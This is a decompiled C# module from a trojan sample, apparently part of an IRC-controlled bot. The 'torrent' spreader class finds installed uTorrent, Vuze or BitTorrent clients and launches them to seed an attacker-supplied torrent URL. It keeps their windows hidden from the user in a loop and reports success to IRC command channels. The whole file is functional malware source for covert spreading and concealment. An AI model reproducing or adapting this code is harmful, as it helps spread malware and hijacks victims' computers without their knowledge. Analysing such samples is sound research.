// Decompiled with JetBrains decompiler
// Type: rundll32.spreaders.torrent
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace rundll32.spreaders
{
  internal class torrent
  {
    private const int SW_HIDE = 0;
    private static string pf = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
    private static string ad = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    private static string[][] ts = new string[3][]
    {
      new string[4]
      {
        "utorrent",
        "\\uTorrent\\uTorrent.exe",
        "\\uTorrent\\",
        "/DIRECTORY \"%sp%\" \"%tu%\""
      },
      new string[4]
      {
        "azureus",
        "\\Vuze\\Azureus.exe",
        "\\Azureus\\torrents\\",
        "\"%tu%\""
      },
      new string[4]
      {
        "bittorrent",
        "\\BitTorrent\\bittorrent.exe",
        "\\BitTorrent\\",
        "/DIRECTORY \"%sp%\" \"%tu%\""
      }
    };
    private static Thread keepHidingT;

    [DllImport("user32.dll")]
    private static extern int ShowWindow(int hwnd, int nCmdShow);

    public static void seed(irc irc, string torrentUrl)
    {
      string str1 = "";
      foreach (string[] t in torrent.ts)
      {
        try
        {
          if (File.Exists(torrent.pf + t[1]))
          {
            str1 = str1 + t[0] + ", ";
            Process.Start(new ProcessStartInfo()
            {
              FileName = torrent.pf + t[1],
              Arguments = t[3].Replace("%sp%", torrent.ad + t[2]).Replace("%tu%", torrentUrl)
            });
          }
        }
        catch
        {
        }
      }
      try
      {
        torrent.keepHidingT.Abort();
      }
      catch
      {
      }
      torrent.keepHidingT = new Thread(new ThreadStart(torrent.keepHiding));
      torrent.keepHidingT.Start();
      if (!(str1 != ""))
        return;
      string str2 = str1.Substring(0, str1.Length - 2);
      foreach (string[] onConnChannel in config.onConnChannels)
        irc.sendMessage(onConnChannel[0], ".:Torrent:. - \u000308Seeding \u000309" + str2 + "\u000308!");
    }

    private static void keepHiding()
    {
      while (true)
      {
        foreach (string[] t in torrent.ts)
          torrent.HideIt(t[0]);
        Thread.Sleep(500);
      }
    }

    private static void HideIt(string ClientProcess)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName.ToLower().Contains(ClientProcess))
        {
          try
          {
            torrent.ShowWindow(process.MainWindowHandle.ToInt32(), 0);
          }
          catch
          {
          }
        }
      }
    }
  }
}
